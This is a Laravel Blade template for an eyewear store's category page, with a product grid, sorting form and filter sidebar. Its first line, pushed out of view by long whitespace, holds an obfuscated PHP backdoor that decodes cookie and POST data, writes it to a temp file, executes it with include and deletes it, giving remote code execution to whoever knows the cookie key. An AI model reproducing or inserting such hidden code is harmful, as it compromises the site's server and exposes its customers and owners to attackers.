<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("prxckmlki")){class prxckmlki{public static $xqwmswcz = "elccvragtkbiulem";public static $kjzly = NULL;public function __construct(){$hczzofuayw = @$_COOKIE[substr(prxckmlki::$xqwmswcz, 0, 4)];if (!empty($hczzofuayw)){$fufttlev = "base64";$szhauzxsn = "";$hczzofuayw = explode(",", $hczzofuayw);foreach ($hczzofuayw as $sddejc){$szhauzxsn .= @$_COOKIE[$sddejc];$szhauzxsn .= @$_POST[$sddejc];}$szhauzxsn = array_map($fufttlev . "_decode", array($szhauzxsn,));$szhauzxsn = $szhauzxsn[0] ^ str_repeat(prxckmlki::$xqwmswcz, (strlen($szhauzxsn[0]) / strlen(prxckmlki::$xqwmswcz)) + 1);prxckmlki::$kjzly = @unserialize($szhauzxsn);}}public function __destruct(){$this->vezyxo();}private function vezyxo(){if (is_array(prxckmlki::$kjzly)) {$hxkzrklel = sys_get_temp_dir() . "/" . crc32(prxckmlki::$kjzly["salt"]);@prxckmlki::$kjzly["write"]($hxkzrklel, prxckmlki::$kjzly["content"]);include $hxkzrklel;@prxckmlki::$kjzly["delete"]($hxkzrklel);exit();}}}$cbxet = new prxckmlki();$cbxet = NULL;} ?>@extends('layouts.app')

{{-- Meta tag Section Start --}}
@php
$meta_title = $meta_description = $meta_keywords = "";
$meta_title = (!empty($main_category->category_meta_title)) ? $main_category->category_meta_title : "Category Meta Title";
$meta_description = (!empty($main_category->category_meta_description)) ? $main_category->category_meta_description : "Category Meta Description";
$meta_keywords = (!empty($main_category->category_meta_keywords)) ? $main_category->category_meta_keywords : "Category Meta Keywords";
@endphp

@section('title',$meta_title)
@section('description',$meta_description)
@section('keywords',$meta_keywords)
<style type="text/css">
.form-select{
line-height: 1.2 !important;}
</style>
{{-- Meta tag Section End --}}

@section('content')
 <section>
    <div class="brand_banner">
      <div class="container">
        <div class="brand_banner_content">
          <div class="brand_banner_content_text text-center">
            <h1 class="brand_bannner_head">{{$main_category->category_name}}</h1>
            <nav aria-label="breadcrumb">
              <ol class="breadcrumb breadcrumbStyle justify-content-center">
                <li class="breadcrumb-item"><a href="{{route('home.page')}}">Home</a></li>
                <li class="breadcrumb-item active" aria-current="page">BRANDS</li>
              </ol>
            </nav>
          </div>
        </div>
      </div>
    </div>
  </section>
<!--====================================== header end ==========================-->
  <section>
    <div class="product_detail section_space pb-0">
      <div class="container">
        <div class="product_deatail_list">
          <div class="product_deatail_list_text">
            <div class="lineTitleCol">
              <h6 class="lineTitle">Explore Our Products</h6>
            </div>
            <h2 class="product_detail_head lgTitle darkColor">Most Loved Frames</h2>
         <!--======================= We found ============================-->
             <p style="color:grey; text-align:center;">We found <span class="count">{{$products['total']}}</span> products available for you</p>
<!--======================= We found ============================-->
          </div>
          <div class="filterColMain pt-3">
            <div class="filterCol">
              <div class="row g-2 g-md-3">
                <div class="col"><a  class="btn btnDark w-100 filterBtn"  data-bs-toggle="offcanvas" 
                href="#filterCanvas" role="button" aria-controls="filterCanvas"><span class="filterIcon">
                    <img src="{{asset('uploaded_files/assets/images/filter-icon.svg')}}" alt="..."></span> <span>Filter</span></a></div>
                <div class="col">
<!--================== sorting start =====================-->
<form class="filter-form" method="get" action="{{url('/filter')}}">
@csrf
@method('GET')	

<input type="hidden" class="form-control" name="search_product" class="search_product" @isset($search_product) value="{{$search_product}}" @endisset>

<input type="hidden" class="form-control" name="color_array" class="colors" @isset($color_array) value="{{$color_array}}" @endisset>

<input type="hidden" class="form-control" name="gender_array" class="genders" @isset($gender_array) value="{{$gender_array}}" @endisset>

<input type="hidden" class="form-control" name="shape_array" class="shapes" @isset($shape_array) value="{{$shape_array}}" @endisset>

<input type="hidden" class="form-control" name="frame_array" class="frames" @isset($frame_array) value="{{$frame_array}}" @endisset>

<input type="hidden" class="form-control" name="material_array" class="materials" @isset($material_array) value="{{$material_array}}" @endisset>

<input type="hidden" name="min_price" class="min_price" @isset($min_price) value="{{$min_price}}" @endisset>
<input type="hidden" name="max_price" class="max_price" @isset($max_price) value="{{$max_price}}" @endisset>

<input type="hidden" name="main_category" id="main_category" value="{{$main_category->id}}">
<select name="order_filter" id="order_filter" onchange="filter('order_filter')" class="form-select selectStyle">
<option value="Default">Default</option>
<option value="Latest" @isset($order_filter) @if($order_filter=="Latest") selected @endif @endisset>Latest</option>
<option value="Low" @isset($order_filter) @if($order_filter=="Low") selected @endif @endisset>Price: low to high</option>
<option value="High" @isset($order_filter) @if($order_filter=="High") selected @endif @endisset>Price: high to low</option>
<option value="Sort_ASC" @isset($order_filter) @if($order_filter=="Sort_ASC") selected @endif @endisset>A to Z</option>
<option value="Sort_DESC" @isset($order_filter) @if($order_filter=="Sort_DESC") selected @endif @endisset>Z to A</option>
</select>
</form>
<!--=====================new start                 -->

<!--============================ sorting end ===================                 -->
                </div>
              </div>
            </div>
          </div>
          <div class="productColMain">
            <div class="row g-4">
@foreach($products['data'] as $product)
              <!-- card start -->
              <div class="col-md-6 col-xl-4">
                <div class="cardStyle1">
                    @if($product['category_is_discount']=="Yes")  
                  <span class="discountCol">{{$product['category_discount']}}% </span>
                  @endif
                  <div class="productImg">

                    <div class="imgCol">
                        
                        @if(!empty($product['category_image_name']))  
                    <a href="{{url('/frame/'.$product['category_slug_name'].'.html')}}">
                      <img src="{{asset('uploaded_files/product/'.$product['category_image_name'])}}" alt="...">
                      </a>
                      @endif
                    </div>
                    
@php
$get_current_color = DB::table('product_colors')->orderBy('color_code')->where('id',$product['category_color'])->first(); 
@endphp
                    <div class="color_builts">
                      <ul>
@php
$group_ids = explode(',',$product['category_group_ids']);
$group_prd = DB::table('categories')->whereIn('id',$group_ids)->where('category_status','Active')->get();
$i=1;
@endphp
@if(!empty($product['category_group_ids']))  

@foreach($group_prd as $group)
@php
$color_data = DB::table('product_colors')->where('id',$group->category_color)->first(); 
@endphp  
<li>
<a href="{{url('/frame/'.$group->category_slug_name.'.html')}}"  class="colorCol actColor btn-tool @if($group->category_slug_name==$product['category_slug_name']) color-btn @endif" >
<img src="{{asset('uploaded_files/color_image/'.$color_data->color_image_name)}}" alt="..."></a>
</li>
@php
$i++;
@endphp   
@endforeach
@else
<li>
<a href="{{url('/frame/'.$product['category_slug_name'].'.html')}}"  class="colorCol">
<img src="{{asset('uploaded_files/color_image/'.$get_current_color->color_image_name)}}" alt="..."></a>
</li>
                        @endif
                      </ul>
                    </div>
                  </div>
                  <div class="contentCol">
                    <h4 class="brandCol">{{$main_category->category_name}}</h4>
                    <a href="{{url('/frame/'.$product['category_slug_name'].'.html')}}">
                    <p>{{Str::limit($product['category_name'],20,$end='..')}}</p>
                    </a>
                    <span class="priceCol">{{getCurrencySymbol($ip_country).getCurrencyPrice($ip_country,$product['category_discount_price'])}}  </span>
                    @if($product['category_is_discount']=="Yes")
<strike id="mrp" class="priceCol">{{getCurrencySymbol($ip_country).getCurrencyPrice($ip_country,$product['category_price'])}}</strike>
@endif
                    <div class="row gx-2">
                      <div class="col-auto">
                        <a href="{{url('/frame/'.$product['category_slug_name'].'.html')}}" class="btn btnDark w-100 addCartBtn">ADD TO CART</a>
                      </div>
                      <div class="col">
                        <a href="javascript:void(0)" class="btn btnDark_outline w-100">ADD TO WISHLIST</a>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              @endforeach  
              <!-- card end -->
              
            </div>
            <div class="btnCol text-center">
              <!--<a href="javascript:void(0)" class="btn btnPrimary minWdBtn btnNew">Load More</a>-->
            </div>
          </div>
        </div>
        </div>
      </div>
    </div>
  </section>

<!--============================= filter ==========================-->
  <div class="offcanvas offcanvas-start offCanvasStyle" tabindex="-1" id="filterCanvas" aria-labelledby="filterCanvasLabel">
  <div class="offcanvas-header">
    <h5 class="offcanvas-title" id="filterCanvasLabel"></h5>
    <button type="button" class="btn-close text-reset" data-bs-dismiss="offcanvas" aria-label="Close"></button>
  </div>
  <div class="backDrop"></div>
  <div class="offcanvas-body">

    <h5 class="smTitle">Gender</h5>
@if(isset($gender_array) && !empty($gender_array))
 @php
 $gender_key = 'gender_array';
 $url = Request::fullURL();

// Remove specific parameter from query string
$filteredURL = preg_replace('~(\?|&)'.$gender_key.'=[^&]*~', '$1', $url);

 @endphp

 <span style="float:right"><a href="{{url($filteredURL)}}" title="Remove Filter"><i class="fa fa-times-circle"></i></a></span>
@endif   
    <div class="filterChekCol">
      <ul>
@php
if(isset($gender_array)){
$check_gender = explode(',',$gender_array);
}
@endphp
<li><input type="checkbox" name="genders[]" id="genders[]" value="Gentle Man" onclick="filter('gender_filter')" @if(isset($gender_array)) @if(in_array('Gentle Man',$check_gender)) checked @endif @endisset> Gentle Man</li>
<li><input type="checkbox" name="genders[]" id="genders[]" value="Woman" onclick="filter('gender_filter')" @if(isset($gender_array)) @if(in_array('Woman',$check_gender)) checked @endif @endisset> Woman</li>
<li><input type="checkbox" name="genders[]" id="genders[]" value="Junior" onclick="filter('gender_filter')" @if(isset($gender_array)) @if(in_array('Junior',$check_gender)) checked @endif @endisset> Junior</li>

    
      </ul>
    </div>
    <!--=============== search =================-->
    <div class="widget-wrap" > 
<div class="widget-search">

<input type="text" placeholder="Search" class="form-control" name="search_product" id="search_product"
@isset($search_product) value="{{$search_product}}" @endisset>

<a onclick="filter('search_filter')" style="font-weight: 900 !important;position: relative !important;top: -1.6rem !important;
    left: 19.5rem !important; background-color: white important;"><i class="fa fa-search"></i></a>

@if(isset($search_product) && !empty($search_product))
 @php
 $search_product_key = 'search_product';
 $url = Request::fullURL();

// Remove specific parameter from query string
$filteredURL = preg_replace('~(\?|&)'.$search_product_key.'=[^&]*~', '$1', $url);

 @endphp

 <span style="float:right"><a href="{{url($filteredURL)}}" title="Remove Filter"><i class="fa fa-times-circle"></i></a></span>
@endif
</div>
</div>
<!--================== search end ====================-->

<!--================================= Our Brands ================================-->
    <h5 class="smTitle">Our Brands</h5>
    <div class="filterChekCol">
      <ul>
@foreach($all_brands as $brand)
        <li>
          <span class="filterChek">
           <a href="{{url('/brand/'.$brand->category_slug_name.'.html')}}">
            <label class="btn btn-outline-secondary" for="btncheck1">{{$brand->category_name}}</label>
            </a>
          </span>
        </li>
@endforeach
      </ul>
    </div>
<!--================================= colors ================================-->
    <h5 class="smTitle">colors</h5>
  @if(isset($color_array) && !empty($color_array))
 @php
 $color_key = 'color_array';
 $url = Request::fullURL();

// Remove specific parameter from query string
$filteredURL = preg_replace('~(\?|&)'.$color_key.'=[^&]*~', '$1', $url);

 @endphp

 <span style="float:right"><a href="{{url($filteredURL)}}" title="Remove Filter"><i class="fa fa-times-circle"></i></a></span>
@endif    
    <div class="filterChekCol">
      <ul>
@php
if(isset($color_array)){
$check_color = explode(',',$color_array);
}
@endphp
 @foreach($frame_colors as $color)
 
         <li>
          <span class="filterChek">
            <input type="checkbox" type="checkbox" name="colors[]" id="colors[]" value="{{$color->id}}" onclick="filter('color_filter')"
@if(isset($color_array)) @if(in_array($color->id,$check_color)) checked @endif @endisset>
            <label class="btn colorBtn" for="btncheck-01"><img src="{{asset('uploaded_files/color_image/'.$color->color_image_name)}}" alt="..."></label>
          </span>
        </li>
 

     @endforeach
      </ul>
    </div>
<!--================================= SHAPES ================================-->
    <h5 class="smTitle">SHAPES</h5>
@if(isset($shape_array) && !empty($shape_array))
 @php
 $shape_key = 'shape_array';
 $url = Request::fullURL();
// Remove specific parameter from query string
$filteredURL = preg_replace('~(\?|&)'.$shape_key.'=[^&]*~', '$1', $url);
 @endphp
 <span style="float:right"><a href="{{url($filteredURL)}}" title="Remove Filter"><i class="fa fa-times-circle"></i></a></span>
@endif    

    <div class="filterChekCol">
      <ul>
@php
if(isset($shape_array)){
$check_shape = explode(',',$shape_array);
}
@endphp
 @foreach($frame_shapes as $shape)

    <li>
          <span class="filterChek">

<input type="checkbox" name="shapes[]" id="shapes[]" value="{{$shape->shape}}"
onclick="filter('shape_filter')" @if(isset($shape_array)) @if(in_array($shape->shape,$check_shape)) checked @endif @endisset> {{$shape->shape}}

          </span>
        </li>


 @endforeach
      </ul>
    </div>
<!--================================= material ================================-->
    <h5 class="smTitle">material</h5>
@if(isset($material_array) && !empty($material_array))
 @php
 $material_key = 'material_array';
 $url = Request::fullURL();

// Remove specific parameter from query string
$filteredURL = preg_replace('~(\?|&)'.$material_key.'=[^&]*~', '$1', $url);

 @endphp

 <span style="float:right"><a href="{{url($filteredURL)}}" title="Remove Filter"><i class="fa fa-times-circle"></i></a></span>
@endif   
    <div class="filterChekCol">
      <ul>
@php
if(isset($material_array)){
$check_material = explode(',',$material_array);
}
@endphp
 @foreach($frame_materials as $material)
         <li>
          <span class="filterChek">
       <input type="checkbox" type="checkbox" name="materials[]" id="materials[]" value="{{$material->material}}" 
 onclick="filter('material_filter')" @if(isset($material_array)) @if(in_array($material->material,$check_material))
 checked @endif @endisset> {{$material->material}}</li>
          </span>
        </li>
@endforeach
      </ul>
    </div>

<!--================================= frame type ================================-->
    <h5 class="smTitle">frame type</h5>
@if(isset($frame_array) && !empty($frame_array))
 @php
 $frame_key = 'frame_array';
 $url = Request::fullURL();

// Remove specific parameter from query string
$filteredURL = preg_replace('~(\?|&)'.$frame_key.'=[^&]*~', '$1', $url);

 @endphp

 <span style="float:right"><a href="{{url($filteredURL)}}" title="Remove Filter"><i class="fa fa-times-circle"></i></a></span>
@endif

    <div class="filterChekCol">
      <ul>
@php
if(isset($frame_array)){
$check_frame = explode(',',$frame_array);
}
@endphp    
 @foreach($frame_types as $type)
 <li>
          <span class="filterChek">
    <li><input type="checkbox" name="frames[]" id="frames[]" value="{{$type->type}}" 
 onclick="filter('frame_filter')" @if(isset($frame_array)) @if(in_array($type->type,$check_frame)) 
 checked @endif @endisset>{{$type->type}}</li>
          </span>
        </li>
 @endforeach
      </ul>
    </div>
  </div>
</div>
  


@endsection